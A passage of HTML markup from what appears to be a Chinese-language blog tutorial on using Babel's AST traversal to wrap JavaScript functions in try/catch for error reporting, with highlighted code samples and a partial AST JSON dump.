    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'i an sync function'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'i am async function'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_e2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_e2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'i am async function'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_e3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_e3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看到，所有的函数体都已经被try/catch包裹住了，同时可以在catch中做异常上报的工作。&lt;/p&gt;

&lt;h3 id=&quot;实现&quot;&gt;实现&lt;/h3&gt;

&lt;p&gt;这个功能的实现，主要是依靠着&lt;strong&gt;babel&lt;/strong&gt;提供的遍历&lt;strong&gt;抽象语法树&lt;/strong&gt;（Abstract Syntax Tree，即AST）的能力。&lt;/p&gt;

&lt;p&gt;而javascrip的AST，我们可以在&lt;a href=&quot;https://astexplorer.net/&quot;&gt;这里&lt;/a&gt;去熟悉。例如下面这个例子&lt;/p&gt;

&lt;p&gt;源代码&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;AST结构&lt;/p&gt;

&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Program&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;start&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;end&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;46&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;body&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;VariableDeclaration&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;start&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;end&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;declarations&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;VariableDeclarator&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;start&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;end&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Identifier&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;start&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;end&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;init&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Literal&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;start&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;end&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;value&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;raw&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;kind&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;const&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;FunctionDeclaration&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;start&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;end&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;46&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Identifier&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;start&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;end&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;b&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;generator&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;expression&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;params&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;body&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;BlockStatement&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;start&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;end&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;46&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;body&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ExpressionStatement&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;start&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;29&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;end&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;44&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;expression&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
              &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;CallExpression&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
              &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;start&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;29&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
              &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;end&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;43&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
              &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;callee&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;MemberExpression&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;start&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;29&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;end&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;object&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Identifier&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;start&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;29&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;end&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;console&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
